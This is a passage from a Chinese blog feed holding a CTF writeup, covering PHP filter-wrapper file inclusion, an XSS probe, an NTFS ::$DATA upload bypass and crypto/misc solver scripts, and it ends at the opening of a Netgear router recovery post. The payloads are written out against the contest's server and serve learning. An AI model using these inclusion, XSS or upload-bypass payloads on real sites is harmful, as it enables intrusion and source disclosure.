<li><p><a href="http://192.144.182.32:8001/abf20c91a442da48/3/?v1%5B%5D=&amp;v2%5B%5D=&amp;v3%5B%5D=">http://192.144.182.32:8001/abf20c91a442da48/3/?v1[]=&amp;v2[]=&amp;v3[]=</a></p>
</li>
</ul>
<h4 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h4><p>访问发现页面空白 查看源代码  发现注释include1.php</p>
<p>访问<a href="http://192.144.182.32:8001/abf20c91a442da48/2/include1.php%E4%BC%9A%E8%87%AA%E5%8A%A8%E8%B7%B3%E8%BD%AC%E5%88%B0http://192.144.182.32:8001/abf20c91a442da48/2/include1.php?file=index">http://192.144.182.32:8001/abf20c91a442da48/2/include1.php会自动跳转到http://192.144.182.32:8001/abf20c91a442da48/2/include1.php?file=index</a></p>
<p>尝试把index换成include1构造伪协议访问得到base64加密的include1.php源代码</p>
<p><a href="http://192.144.182.32:8001/abf20c91a442da48/2/include1.php?file=php://filter/read=convert.base64-encode/resource=include1">http://192.144.182.32:8001/abf20c91a442da48/2/include1.php?file=php://filter/read=convert.base64-encode/resource=include1</a></p>
<p>解密得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    @<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|data|ftp|input|%00|flag/i&#x27;</span>, <span class="variable">$file</span>) || <span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>,<span class="string">&quot;..&quot;</span>) !== <span class="literal">FALSE</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$file</span>)&gt;=<span class="number">100</span> || <span class="variable">$file</span>===<span class="string">&quot;include1&quot;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; error! &lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">			<span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">			<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;tips&quot;</span>,<span class="string">&quot;include2.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:include1.php?file=index&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>审计代码发现过滤了flag，但是有一个include2.php，同样构造得到源码</p>
<p><a href="http://192.144.182.32:8001/abf20c91a442da48/2/include1.php?file=php://filter/read=convert.base64-encode/resource=include2">http://192.144.182.32:8001/abf20c91a442da48/2/include1.php?file=php://filter/read=convert.base64-encode/resource=include2</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|data|ftp|input|%00|base/i&#x27;</span>, <span class="variable">$file</span>) || <span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>,<span class="string">&quot;..&quot;</span>) !== <span class="literal">FALSE</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$file</span>)&gt;=<span class="number">100</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; error! &lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">		<span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;file not found&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现include2没有过滤flag字符串，但是过滤了base，没办法直接得到flag源码</p>
<p>经过一番百度了解到可以使用rot13过滤器，详情看<a href="https://www.php.net/manual/zh/wrappers.php.php">这里</a></p>
<p>于是可以构造<a href="http://192.144.182.32:8001/abf20c91a442da48/2/include2.php?file=php://filter/read=string.rot13/resource=flag">http://192.144.182.32:8001/abf20c91a442da48/2/include2.php?file=php://filter/read=string.rot13/resource=flag</a></p>
<p>查看源代码就可以得到rot13编码后的flag</p>
<p><img src="/posts/ee2eca3f/image-20200701135810268.png" alt="image-20200701135810268"></p>
<h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>输入”&gt;123&lt;” 页面显示123&lt;””&gt;  于是可以插入</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(/XXX/)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到flag  （ps：提交注意格式）</p>
<p><img src="/posts/ee2eca3f/image-20200701140757589.png" alt="image-20200701140757589"></p>
<h4 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h4><h5 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h5><blockquote>
<p>上传可执行的php文件。flag格式：flag{xxx}。<br><a href="http://192.144.182.32:8001/abf20c91a442da48/6/index.php">http://192.144.182.32:8001/abf20c91a442da48/6/index.php</a></p>
<p>hint1: 系统是Windows<br>hint2: 磁盘为NTFS格式</p>
</blockquote>
<p>根据提示，使用windows系统特性进行绕过</p>
<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>php在window系统运行时，如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名</p>
<h5 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h5><p><img src="/posts/ee2eca3f/image-20200628194212630.png" alt="image-20200628194212630"></p>
<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h4><p>010 Editer打开就是flag</p>
<p><img src="/posts/ee2eca3f/image-20200628194457077.png" alt="image-20200628194457077"></p>
<h4 id="解密吧"><a href="#解密吧" class="headerlink" title="解密吧"></a>解密吧</h4><p>题目给了一个shadow文件，直接使用john shadow破解得到hello123</p>
<p>所以flag{hello123}</p>
<h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p>三位一组分开  就可以得到flag</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">题目:</span><br><span class="line"></span><br><span class="line">FOKLPLA</span><br><span class="line">CGGODII</span><br><span class="line">SSSDOOP</span><br><span class="line"></span><br><span class="line">注：flag格式为flag&#123;&#125;。</span><br><span class="line">FOK</span><br><span class="line">LPL</span><br><span class="line">ACG</span><br><span class="line">GOD</span><br><span class="line">IIS</span><br><span class="line">SSD</span><br><span class="line">OOP</span><br><span class="line">FLAG IS OOPCOISOKLGDSDP</span><br></pre></td></tr></table></figure>

<p>flag{OOPCOISOKLGDSDP}</p>
<h4 id="加密的压缩包"><a href="#加密的压缩包" class="headerlink" title="加密的压缩包"></a>加密的压缩包</h4><p>zipinfo命令查看zip文件信息，可以发现有4个txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  Desktop zipinfo flag.zip</span><br><span class="line">Archive:  flag.zip</span><br><span class="line">Zip file size: 620 bytes, number of entries: 4</span><br><span class="line">-rw-a--     6.3 fat        6 Bx stor 19-Mar-14 19:23 1.txt</span><br><span class="line">-rw-a--     6.3 fat        6 Bx stor 19-Mar-14 19:26 2.txt</span><br><span class="line">-rw-a--     6.3 fat        6 Bx stor 19-Mar-14 19:27 3.txt</span><br><span class="line">-rw-a--     6.3 fat       38 Bx stor 19-Mar-14 19:29 flag.txt</span><br><span class="line">4 files, 56 bytes uncompressed, 56 bytes compressed:  0.0%</span><br></pre></td></tr></table></figure>

<p>使用python获取crc32值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author    :iqiqiya</span></span><br><span class="line"><span class="comment"># @Blog      :iqiqiya.com</span></span><br><span class="line"><span class="comment"># @Time      :2020/7/2</span></span><br><span class="line"><span class="comment"># @FileName  :crc32破解zip压缩包.py</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getcrc</span>(<span class="params">zip_file_name</span>):</span><br><span class="line">    f = zipfile.ZipFile(zip_file_name, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    <span class="comment"># 这里替换名字 得到不同crc32</span></span><br><span class="line">    GetCrc = f.getinfo(<span class="string">&quot;flag.txt&quot;</span>)</span><br><span class="line">    crc = GetCrc.CRC</span><br><span class="line">    <span class="keyword">return</span> crc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">txt_crc = getcrc(<span class="string">&quot;flag.zip&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(txt_crc)</span><br></pre></td></tr></table></figure>

<p>得到关系（ps：也可以使用winrar或者bandzip直接查看）</p>
<table>
<thead>
<tr>
<th>文件名称</th>
<th>CRC32</th>
</tr>
</thead>
<tbody><tr>
<td>1.txt</td>
<td>0x4b10deba</td>
</tr>
<tr>
<td>2.txt</td>
<td>0x1fd8a07a</td>
</tr>
<tr>
<td>3.txt</td>
<td>0xe7f7e18c</td>
</tr>
<tr>
<td>flag.txt</td>
<td>0x88940fde</td>
</tr>
</tbody></table>
<p>接着使用<a href="https://github.com/theonlypwner/crc32">crc32.py</a>项目碰撞crc32</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  crc32 git:(master) python crc32.py reverse 0x4b10deba</span><br><span class="line">4 bytes: &#123;0x16, 0x6d, 0xbe, 0xb2&#125;</span><br><span class="line">verification checksum: 0x4b10deba (OK)</span><br><span class="line">alternative: 78CgbK (OK)</span><br><span class="line">alternative: 9zqj3M (OK)</span><br><span class="line">alternative: APYPnq (OK)</span><br><span class="line">alternative: BMCoE9 (OK)</span><br><span class="line">alternative: D8vMpO (OK)</span><br><span class="line">alternative: IZO3bY (OK)</span><br><span class="line">alternative: Passis (OK)</span><br><span class="line">alternative: Qa2Brj (OK)</span><br><span class="line">alternative: RA911z (OK)</span><br><span class="line">alternative: WxtMCX (OK)</span><br><span class="line">alternative: a_jiUt (OK)</span><br><span class="line">alternative: d7EtKJ (OK)</span><br><span class="line">alternative: hIrgCQ (OK)</span><br><span class="line">alternative: iI3VXH (OK)</span><br><span class="line">alternative: j8ZDwD (OK)</span><br><span class="line">alternative: lMofB2 (OK)</span><br><span class="line">alternative: mlpG0g (OK)</span><br><span class="line">alternative: nP4hrc (OK)</span><br><span class="line">alternative: oPuYiz (OK)</span><br><span class="line">alternative: x54H2B (OK)</span><br><span class="line">alternative: yxXDDS (OK)</span><br><span class="line">➜  crc32 git:(master) python crc32.py reverse 0x1fd8a07a</span><br><span class="line">4 bytes: &#123;0x8a, 0x2f, 0xcb, 0xe4&#125;</span><br><span class="line">verification checksum: 0x1fd8a07a (OK)</span><br><span class="line">alternative: 6hjEgo (OK)</span><br><span class="line">alternative: 8Zd939 (OK)</span><br><span class="line">alternative: Eh_ouk (OK)</span><br><span class="line">alternative: Q1ZQlW (OK)</span><br><span class="line">alternative: TYuLri (OK)</span><br><span class="line">alternative: U5GPm4 (OK)</span><br><span class="line">alternative: We1c0m (OK)</span><br><span class="line">alternative: eglVNn (OK)</span><br><span class="line">alternative: ff95d2 (OK)</span><br><span class="line">alternative: hT7I0d (OK)</span><br><span class="line">alternative: jh2Wiy (OK)</span><br><span class="line">alternative: lqtXXK (OK)</span><br><span class="line">alternative: mmz5BF (OK)</span><br><span class="line">alternative: mq5iCR (OK)</span><br><span class="line">alternative: sOAKcG (OK)</span><br><span class="line">alternative: tVFuIl (OK)</span><br><span class="line">alternative: yyR66r (OK)</span><br><span class="line">alternative: zYYEub (OK)</span><br><span class="line">➜  crc32 git:(master) python crc32.py reverse 0xe7f7e18c</span><br><span class="line">4 bytes: &#123;0xc0, 0x5b, 0x01, 0x73&#125;</span><br><span class="line">verification checksum: 0xe7f7e18c (OK)</span><br><span class="line">alternative: 0Bp_Lu (OK)</span><br><span class="line">alternative: 1B1nWl (OK)</span><br><span class="line">alternative: 9ThQZP (OK)</span><br><span class="line">alternative: A3mVjd (OK)</span><br><span class="line">alternative: RsoVYs (OK)</span><br><span class="line">alternative: UjhhsX (OK)</span><br><span class="line">alternative: Ze6iTO (OK)</span><br><span class="line">alternative: _ajYN5 (OK)</span><br><span class="line">alternative: cMvLet (OK)</span><br><span class="line">alternative: dTqrO_ (OK)</span><br><span class="line">alternative: eT0CTF (OK)</span><br><span class="line">alternative: mc7l06 (OK)</span><br><span class="line">alternative: n_sCr2 (OK)</span><br><span class="line">alternative: o3A_mo (OK)</span><br></pre></td></tr></table></figure>

<p>可以得到PassisWe1c0meT0CTF</p>
<p>解压密码就是We1c0meT0CTF，解压得到flag</p>
<h4 id="一般难度的加解密"><a href="#一般难度的加解密" class="headerlink" title="一般难度的加解密"></a>一般难度的加解密</h4><p>常规RSA题目，先求d就可以得到m，就是最后解码有点烦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author    :iqiqiya</span></span><br><span class="line"><span class="comment"># @Blog      :iqiqiya.com</span></span><br><span class="line"><span class="comment"># @Time      :2020/7/3</span></span><br><span class="line"><span class="comment"># @FileName  :rsa.py</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将一串十进制转换为ASCII</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int2ascii</span>(<span class="params">int_str</span>):</span><br><span class="line">    list_s = []</span><br><span class="line">    new_str = <span class="built_in">hex</span>(int_str)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(new_str), <span class="number">2</span>):</span><br><span class="line">        list_s.append(<span class="built_in">chr</span>(<span class="built_in">int</span>(new_str[i:i+<span class="number">2</span>], <span class="number">16</span>)))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(list_s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将一串十六进制转换为ASCII</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex2ascii</span>(<span class="params">new_str</span>):</span><br><span class="line">    list_s = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(new_str), <span class="number">2</span>):</span><br><span class="line">        list_s.append(<span class="built_in">chr</span>(<span class="built_in">int</span>(new_str[i:i+<span class="number">2</span>], <span class="number">16</span>)))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(list_s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将一串字符串转换为十进制串</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2int</span>(<span class="params">str_str</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(binascii.b2a_hex(str_str), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    c = <span class="number">1108720364492385799805717943937918060048526686632395746898605745688969945693300368550572535124894531708904132908712946064602541973611760483878801239151031299505176101339745929473781263049557987390484771902312139798039911597877998250388726877993580914980474480293867479170492238375158080782836777298213863290116245676895861278718289218295612330959263259493578492707392744409690646283644352285471769766271487818771858490165583525701466222529932104739972329024611642134115654847192615572712261792672665564752969261173197159412801526730369043148932804674062143090741836944217972042953469090269447505782409398031378370152</span></span><br><span class="line">    n = <span class="number">26221250500210405881132117557481723828766403943957950577451874805030106596081117375156772427206128405044267565826746522083073344532158814742511219204087934469113726393167485385378981630858737362324790588554286527642921364757519448451820127769942271309179542598449740660811048250973469013409521371791098074887056492924891157941526458248272889917641905464741404650030958545690892412495947165576458308474382558997629624440993069542093798549029729504677699266868041518498869029774178904303543559872895807099482683032802362220977267523960685985521766229201489330046455426324265875811125282379015211742752299449996253305521</span></span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    d = gmpy2.invert(e, (n-<span class="number">1</span>))</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    <span class="comment"># print m</span></span><br><span class="line">    flag = int2ascii(m)</span><br><span class="line">    flag = <span class="built_in">hex</span>(<span class="built_in">int</span>(flag))</span><br><span class="line">    <span class="comment"># 去掉最后的L</span></span><br><span class="line">    flag = flag[:-<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># 最终的flag</span></span><br><span class="line">    <span class="built_in">print</span> hex2ascii(flag[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h4 id="凯撒"><a href="#凯撒" class="headerlink" title="凯撒"></a>凯撒</h4><p>题目给出很多ASCII，整理转成字符，遍历凯撒</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author    :iqiqiya</span></span><br><span class="line"><span class="comment"># @Blog      :iqiqiya.com</span></span><br><span class="line"><span class="comment"># @Time      :2020/7/3</span></span><br><span class="line"><span class="comment"># @FileName  :凯撒.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convertChar</span>(<span class="params">ciphertext, offset</span>):</span><br><span class="line">    chars = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> ciphertext:</span><br><span class="line">        is_upper_flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> char.isupper():</span><br><span class="line">            char = char.lower()</span><br><span class="line">            is_upper_flag = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">not</span> <span class="keyword">in</span> chars:</span><br><span class="line">            outputChar(is_upper_flag, char)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        tempchar_ascii = <span class="built_in">ord</span>(char) + offset</span><br><span class="line">        tempchar = <span class="built_in">chr</span>(tempchar_ascii)</span><br><span class="line">        <span class="keyword">if</span> tempchar <span class="keyword">not</span> <span class="keyword">in</span> chars:</span><br><span class="line">            <span class="keyword">if</span> offset &lt; <span class="number">0</span>:</span><br><span class="line">                tempchar_ascii += <span class="built_in">len</span>(chars)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tempchar_ascii -= <span class="built_in">len</span>(chars)</span><br><span class="line">        tempchar = <span class="built_in">chr</span>(tempchar_ascii)</span><br><span class="line">        outputChar(is_upper_flag, tempchar)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">outputChar</span>(<span class="params">is_upper_flag, char</span>):</span><br><span class="line">    <span class="keyword">if</span> is_upper_flag == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(char.upper(), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(char, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">a = [<span class="number">109</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">110</span>, <span class="number">123</span>, <span class="number">108</span>, <span class="number">53</span>, <span class="number">55</span>, <span class="number">105</span>, <span class="number">57</span>, <span class="number">108</span>, <span class="number">49</span>, <span class="number">56</span>, <span class="number">105</span>, <span class="number">48</span>, <span class="number">56</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">48</span>, <span class="number">107</span>, <span class="number">48</span>, <span class="number">53</span>, <span class="number">104</span>, <span class="number">51</span>, <span class="number">106</span>, <span class="number">53</span>, <span class="number">57</span>, <span class="number">57</span>, <span class="number">48</span>, <span class="number">48</span>, <span class="number">105</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">63</span>, <span class="number">63</span>, <span class="number">63</span>, <span class="number">125</span>, <span class="number">116</span>, <span class="number">107</span>, <span class="number">53</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">57</span>, <span class="number">106</span>, <span class="number">49</span>, <span class="number">107</span>, <span class="number">107</span>, <span class="number">51</span>, <span class="number">104</span>, <span class="number">109</span>, <span class="number">53</span>, <span class="number">105</span>, <span class="number">105</span>, <span class="number">54</span>, <span class="number">57</span>, <span class="number">56</span>, <span class="number">108</span>, <span class="number">109</span>, <span class="number">107</span>, <span class="number">56</span>, <span class="number">49</span>, <span class="number">106</span>, <span class="number">104</span>, <span class="number">53</span>, <span class="number">105</span>, <span class="number">106</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">108</span>, <span class="number">53</span>, <span class="number">109</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(a[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">    convertChar(flag, i)</span><br></pre></td></tr></table></figure>

<p>得到flag{e57b9e18b08bff0d05a3c59900b10???}md5:29c1dd3af5bb698efd81ca5bc1178e5f</p>
<p>开始还以为是</p>
<p>md5(e57b9e18b08bff0d05a3c59900b10???) &#x3D; 29c1dd3af5bb698efd81ca5bc1178e5f</p>
<p>然后发现跑不出来，somd5一下得到9a4，才意识到是后三位爆破</p>
<p>脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author    :iqiqiya</span></span><br><span class="line"><span class="comment"># @Blog      :iqiqiya.com</span></span><br><span class="line"><span class="comment"># @Time      :2020/7/3</span></span><br><span class="line"><span class="comment"># @FileName  :md5碰撞.py</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">dic=[<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dic)):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dic)):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dic)):</span><br><span class="line">                m=dic[a]+dic[b]+dic[c]</span><br><span class="line">                flag=hashlib.md5()</span><br><span class="line">                flag.update(m)</span><br><span class="line">                md5=flag.hexdigest()</span><br><span class="line">                <span class="keyword">if</span> md5==<span class="string">&#x27;29c1dd3af5bb698efd81ca5bc1178e5f&#x27;</span>:</span><br><span class="line">                            <span class="built_in">print</span> m</span><br></pre></td></tr></table></figure>

<p>最后flag{e57b9e18b08bff0d05a3c59900b109a4}</p>
<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h4><p>下载得到一flag.png，发现无法显示，用010 Editer打开发现十六进制数据进行了翻转</p>
<p>脚本处理生成cc.png，打开就是flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author    :iqiqiya</span></span><br><span class="line"><span class="comment"># @Blog      :iqiqiya.com</span></span><br><span class="line"><span class="comment"># @Time      :2020/7/3</span></span><br><span class="line"><span class="comment"># @FileName  :pic_rev.py</span></span><br><span class="line">infile = file(<span class="string">&quot;flag.png&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line"><span class="comment"># outfile = file(&quot;out.txt&quot;, &quot;wb&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 读取flag.png的十六进制并翻转写入out.txt</span></span><br><span class="line">    hex_list = []</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        c = infile.read(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> c:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        hex_list.append(<span class="built_in">hex</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:])</span><br><span class="line">    hex_list.reverse()</span><br><span class="line">    infile.close()</span><br><span class="line">    <span class="comment"># outfile.writelines(hex_list)</span></span><br><span class="line">    <span class="comment">#  outfile.close()</span></span><br><span class="line">    ccfile = file(<span class="string">&quot;cc.png&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> hex_list:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(x) == <span class="number">1</span>:</span><br><span class="line">            x = <span class="string">&#x27;0&#x27;</span>+x</span><br><span class="line">        <span class="built_in">print</span> x</span><br><span class="line">        ccfile.write(x.decode(<span class="string">&quot;hex&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="/posts/ee2eca3f/image-20200703163735143.png" alt="image-20200703163735143"></p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://bbs.ichunqiu.com/thread-53460-1-1.html">上传漏洞之利用Windows&#x2F;Linux系统特性绕过</a></p>
]]></content>
      <categories>
        <category>CTF竞赛</category>
      </categories>
      <tags>
        <tag>NSCTF</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Netgear路由器救砖教程</title>
    <url>/posts/d0ae75c3.html</url>
    <content><![CDATA[<p>记录下Netgear R8000成功救砖</p>
<span id="more"></span>

<h2 id="详细教程"><a href="#详细教程" class="headerlink" title="详细教程"></a>详细教程</h2><p>本文以Netgear R8000为例</p>
<p>先下载匹配的官方固件和救砖程序Nmrpflash，打包下载</p>
<blockquote>
